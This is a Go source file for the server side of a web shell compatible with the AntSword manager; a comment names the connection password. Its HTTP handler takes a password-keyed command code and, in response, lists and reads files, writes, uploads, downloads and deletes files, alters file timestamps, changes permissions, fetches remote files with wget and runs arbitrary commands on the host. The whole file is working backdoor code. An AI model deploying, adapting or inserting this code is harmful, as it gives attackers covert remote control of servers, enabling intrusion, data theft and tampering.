package server

import (
	"fmt"
	"log"
	"net/http"
	"net/url"

	"github.com/Wd0g/Gos/lib/custom"
)

type Custom struct {
	Pwd     string // 蚁剑连接密码
	Decoder func(url.Values) url.Values
	Encoder func(string) string
}

func (c Custom) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	// 解析参数，解码参数
	_ = req.ParseForm()
	req.PostForm = c.Decoder(req.PostForm)

	args := req.PostFormValue(c.Pwd)
	log.Printf("<-- %s\tFlag:%s\n", req.RemoteAddr, args)
	// 密码参数不能为空
	if args == "" {
		return
	}

	var res string
	var err error
	switch args {
	case "A":
		res, err = custom.BaseInfo()
	case "B":
		res, err = custom.FileTree(req.PostFormValue("z1"))
	case "C":
		res, err = custom.ReadFile(req.PostFormValue("z1"))
	case "D":
		res, err = custom.WriteFile(req.PostFormValue("z1"), req.PostFormValue("z2"))
	case "E":
		res, err = custom.DeleteFileOrDir(req.PostFormValue("z1"))
	case "F":
		res, err = custom.DownloadFile(req.PostFormValue("z1"))
	case "U":
		res, err = custom.UploadFile(req.PostFormValue("z1"), req.PostFormValue("z2"))
	case "H":
		res, err = custom.CopyFileOrDir(req.PostFormValue("z1"), req.PostFormValue("z2"))
	case "I":
		res, err = custom.RenameFileOrDir(req.PostFormValue("z1"), req.PostFormValue("z2"))
	case "J":
		res, err = custom.CreateDir(req.PostFormValue("z1"))
	case "K":
		res, err = custom.ModifyFileOrDirTime(req.PostFormValue("z1"), req.PostFormValue("z2"))
	case "L":
		res, err = custom.Wget(req.PostFormValue("z1"), req.PostFormValue("z2"))
	case "M":
		res, err = custom.ExecuteCommand(req.PostFormValue("z1"), req.PostFormValue("z2"))
	case "Z":
		res, err = custom.TestSupportDBClient()
	case "AA":
		res, err = custom.Chmod(req.PostFormValue("z1"), req.PostFormValue("z2"))
	}

	if err != nil {
		res = fmt.Sprintf("ERROR://%s", err.Error())
	}

	var resByte []byte
	switch args {
	// 客户下载文件时，不需要编码文件内容
	case "F":
		resByte = append([]byte("->|"), []byte(res)...)
	default:
		resByte = append([]byte("->|"), []byte(c.Encoder(res))...)
	}
	resByte = append(resByte, []byte("|<-")...)
	w.Write(resByte)
	return

}
